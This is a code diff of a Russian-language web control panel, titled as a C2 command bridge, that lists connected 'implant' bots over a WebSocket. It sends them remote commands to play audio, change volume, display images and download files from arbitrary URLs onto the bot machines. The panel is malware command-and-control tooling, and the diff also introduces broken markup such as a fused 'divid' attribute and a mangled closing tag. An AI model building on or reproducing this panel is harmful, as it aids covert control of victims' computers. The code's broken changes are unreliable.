@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Версия 6.0 - Интерфейс+) -->
+<!-- Файл: index.html (Версия 5.5 - Финальный Гибрид) -->
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>C2 Коммандный Мостик v6.0</title>
+  <title>C2 Коммандный Мостик v5.5</title>
   <style>
     :root {
       --bg-color: #1a1a1c; --primary-color: #2e2e33; --secondary-color: #45454d;
@@ -13,7 +13,8 @@
     }
     html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); }
     .container { display: flex; flex-direction: column; height: 100%; }
-    header { flex-shrink: 0; color: var(--accent-color); text-align: center; padding: 20px 0; border-bottom: 1px solid var(--secondary-color); }h1, h2, h3 { margin: 0; }
+    header { flex-shrink: 0; color: var(--accent-color); text-align: center; padding: 20px 0; border-bottom: 1px solid var(--secondary-color); }
+    h1, h2, h3 { margin: 0; }
     h2 { color: var(--accent-color); padding-bottom: 10px; margin-bottom: 20px; border-bottom: 1px solid var(--secondary-color); }
     h3 { margin-top: 20px; margin-bottom: 10px; text-align: center; border-top: 1px solid var(--secondary-color); padding-top: 20px; }
     .app-layout { display: flex; flex-grow: 1; overflow: hidden; padding: 25px; gap: 25px; }
@@ -22,18 +23,11 @@
     #bot-list { flex-grow: 1; overflow-y: auto; padding: 0 25px 25px; display: flex; flex-direction: column; gap: 10px; }
     .main-content { flex-grow: 1; overflow-y: auto; padding-right: 10px; }
     section { background-color: var(--primary-color); padding: 25px; border-radius: 12px; border: 1px solid var(--secondary-color); margin-bottom: 25px; }
-
-    /* --- ИЗМЕНЕНИЯ В КОНСОЛИ --- */
-    .log-container { flex-shrink: 0; height: 200px; background-color: #111; border-top: 1px solid var(--secondary-color); display: flex; flex-direction: column; font-family: 'Courier New', Courier, monospace; transition: height 0.3s ease; }
-    .log-container.collapsed { height: 42px; } /* Высота хедера консоли */
-    .log-header { display: flex; justify-content: space-between; align-items: center; padding: 10px; background-color: var(--primary-color); border-bottom: 1px solid var(--secondary-color); }
-    .log-header h3 { margin: 0; padding: 0; border: none; font-size: 1em; }
-    #toggle-log-btn { padding: 2px 8px; font-weight: bold; background-color: var(--secondary-color); border: none; cursor: pointer; }
-    #log-list { flex-grow: 1; overflow-y: auto; font-size: 0.9em; padding: 10px; }
+    .log-container { flex-shrink: 0; height: 200px; background-color: #111; border-top: 1px solid var(--secondary-color); display: flex; flex-direction: column; font-family: 'Courier New', Courier, monospace; }
+    #log-list { flex-grow: 1; overflow-y: auto; padding: 10px; font-size: 0.9em; }
     .log-entry { margin: 2px 0; white-space: pre-wrap; word-break: break-all; }
     .log-info { color: var(--text-color); } .log-success { color: var(--success-color); } .log-error { color: var(--error-color); } .log-command { color: var(--accent-color); }
     .log-timestamp { color: var(--secondary-color); margin-right: 10px; }
-
     footer { display: none; }
     button { color: white; padding: 12px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 1em; font-weight: bold; width: 100%; transition: background-color 0.2s; box-sizing: border-box; }
     button:hover { filter: brightness(1.2); }
@@ -51,16 +45,15 @@
 </head>
 <body>
   <div class="container">
-    <header><h1>Коммандный Мостик v6.0</h1></header>
+    <header><h1>Коммандный Мостик v5.5</h1></header>
 
     <main class="app-layout">
       <aside class="sidebar">
         <h2>Боты в сети</h2>
-        <div id="bot-list"><p style="text-align:center;">Подключение к серверу...</p></div>
+        <divid="bot-list"><p style="text-align:center;">Подключение к серверу...</p></div>
       </aside>
       <div class="main-content">
         <div id="controls-wrapper" style="display:none;">
-          <!-- Секции управления остаются без изменений -->
           <section>
             <h2>Команды для (<span id="selected-bot-name"></span>)</h2>
             <div class="grid-controls">
@@ -97,24 +90,24 @@
     </main>
 
     <div class="log-container">
-      <div class="log-header">
-        <h3>Консоль логов</h3>
-        <button id="toggle-log-btn" title="Свернуть/Развернуть">_</button>
-      </div>
-      <div id="log-list"></div>
+        <div class="log-header" style="display: flex; justify-content: space-between; align-items: center; padding: 10px; background-color: var(--primary-color);">
+            <h3 style="margin:0; padding:0; border:none;">Консоль</h3>
+            <button id="toggle-log-btn" style="padding: 2px 8px;">_</button>
+        </div>
+        <div id="log-list"></div>
     </div>
   </div>
 
   <script>
     // ==============================================================================
-    // JAVASCRIPT-МОЗГ v6.0 (с памятью и сворачиваемой консолью)
+    // JAVASCRIPT-МОЗГ (Твоя рабочая версия 2.0 + мой Кардиостимулятор и Логи)
     // ==============================================================================
     const ui = {
       botList: document.getElementById('bot-list'), controlsWrapper: document.getElementById('controls-wrapper'),
       selectedBotName: document.getElementById('selected-bot-name'), logList: document.getElementById('log-list'),
       audioFilesList: document.getElementById('audio-files-list'), imageFilesList: document.getElementById('image-files-list'),
       volumeSlider: document.getElementById('volume-slider'), urlInput: document.getElementById('url-input'),
-      logContainer: document.querySelector('.log-container'), toggleLogBtn: document.getElementById('toggle-log-btn')
+      logContainer: document.querySelector('.log-container'), toggleLogBtn: document.getElementById('toggle-log-btn'),
     };
     let socket, selectedBotId = null, pingInterval = null;
 
@@ -127,11 +120,12 @@
       ui.logList.appendChild(entry);
       ui.logList.scrollTop = ui.logList.scrollHeight;
     }
+
     function connect() {
       log("Подключение к C2...");
       if (pingInterval) clearInterval(pingInterval);
 
-      socket = new WebSocket(`${window.location.protocol === 'https' ? 'wss' : 'ws'}://${window.location.host}/ws`);
+      socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
 
       socket.onopen = () => {
         log("Соединение установлено.", "success");
@@ -142,11 +136,14 @@
       socket.onmessage = (event) => {
         if (event.data === 'pong') return;
         const msg = JSON.parse(event.data);
+
+        // Твоя старая, рабочая логика обработки сообщений
         if (msg.type === 'bot_list') { updateBotList(msg.data); }
         else if (msg.type === 'bot_details' && msg.bot_id === selectedBotId) { handleBotDetails(msg.data); }
-        else if (msg.type === 'status') { log(`[${msg.bot_id ? msg.bot_id.replace('implant_','') : 'SERVER'}] ${msg.data}`); }
-        else if (msg.type === 'volume_update' && msg.bot_id === selectedBotId) { if(msg.data && msg.data.level !== undefined) ui.volumeSlider.value = msg.data.level; }
-        else if (msg.type === 'file_list_update' && msg.bot_id === selectedBotId) { if(msg.data && msg.data.files) renderBotFiles(msg.data.files); }
+        else if (msg.type === 'status') { log(`[SERVER] ${msg.data}`); }
+        // Обработка обновлений в реальном времени, если сервер их шлет
+        else if (msg.type === 'volume_update' && msg.bot_id === selectedBotId) { if(msg.data.level !== undefined) ui.volumeSlider.value = msg.data.level; }
+        else if (msg.type === 'file_list_update' && msg.bot_id === selectedBotId) { if(msg.data.files) renderBotFiles(msg.data.files); }
       };
 
       socket.onclose = () => {
@@ -159,41 +156,31 @@
 
     function updateBotList(bots) {
       log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
+      const currentSelected = selectedBotId;
       ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
-      bots.forEach(botId => {
-        const btn = document.createElement('button');
+      bots.forEach(botId => { const btn = document.createElement('button');
         btn.textContent = botId.replace('implant_', '');
         btn.className = 'btn-bot';
         btn.onclick = () => selectBot(botId);
         ui.botList.appendChild(btn);
       });
-
-      // --- ИЗМЕНЕНИЕ: ЛОГИКА ЗАПОМИНАНИЯ БОТА ---
-      const savedBotId = localStorage.getItem('lastSelectedBot');
-      if (savedBotId && bots.includes(savedBotId)) {
-        selectBot(savedBotId);
+      if (currentSelected && bots.includes(currentSelected)) {
+        selectBot(currentSelected, false);
       } else {
-        selectBot(bots.length > 0 ? bots[0] : null);
+        selectBot(bots.length > 0 ? bots[0] : null, true);
       }
     }
 
-    function selectBot(botId) {
+    function selectBot(botId, requestDetails = true) {
       selectedBotId = botId;
-      // --- ИЗМЕНЕНИЕ: ЛОГИКА ЗАПОМИНАНИЯ БОТА ---
-      if (botId) {
-        localStorage.setItem('lastSelectedBot', botId);
-      } else {
-        localStorage.removeItem('lastSelectedBot');
-      }
-
       document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
         btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
       });
       if (botId) {
-        log(`Выбран бот: ${botId.replace('implant_', '')}`);
+        if(requestDetails) log(`Выбран бот: ${botId.replace('implant_', '')}`);
         ui.controlsWrapper.style.display = 'block';
         ui.selectedBotName.textContent = botId.replace('implant_', '');
-        socket.send(JSON.stringify({ type: 'get_details', target_id: botId }));
+        if(requestDetails) socket.send(JSON.stringify({ type: 'get_details', target_id: botId }));
       } else {
         ui.controlsWrapper.style.display = 'none';
       }
@@ -203,11 +190,17 @@
       log(`Получены детали для ${selectedBotId.replace('implant_', '')}`);
       if (data.files) renderBotFiles(data.files);
       if (data.volume !== undefined) ui.volumeSlider.value = data.volume;
+      if (data.volume_state) { // Для совместимости с новыми серверами
+          ui.volumeSlider.value = data.volume_state.level;
+          const muteButton = document.querySelector("button[onclick*='mute']");
+          muteButton.textContent = data.volume_state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
+          muteButton.style.backgroundColor = data.volume_state.is_muted ? "var(--danger-color)" : "var(--action-color)";
+      }
     }
 
     function renderBotFiles(files) {
       const audioContainer = ui.audioFilesList;
-      audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
+      audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.<;/p>';
       if(files.audio) files.audio.forEach(file => {
         const btn = document.createElement('button'); btn.textContent = file; btn.className = 'btn-action';
         btn.onclick = () => sendCommand({ action: 'play', filename: file });
@@ -235,15 +228,13 @@
     }
 
     const debounce = (func, delay) => { let timeout; return (...args) => { clearTimeout(timeout); timeout = setTimeout(() => func(...args), delay); }; };
-    const setVolume = debounce(value => sendCommand({ action: 'volume', level: value }), 250);
+    const setVolume = debounce(value => sendCommand({ action: 'volume', level: value }), 200);
     ui.volumeSlider.addEventListener('input', (event) => setVolume(event.target.value));
-
     function downloadFile() {
       const url = ui.urlInput.value.trim();
       if (url) { sendCommand({ action: 'download', url }); }
     }
 
-    // --- ИЗМЕНЕНИЕ: ОБРАБОТЧИК ДЛЯ КНОПКИ СВОРАЧИВАНИЯ ---
     ui.toggleLogBtn.addEventListener('click', () => {
       ui.logContainer.classList.toggle('collapsed');
     });
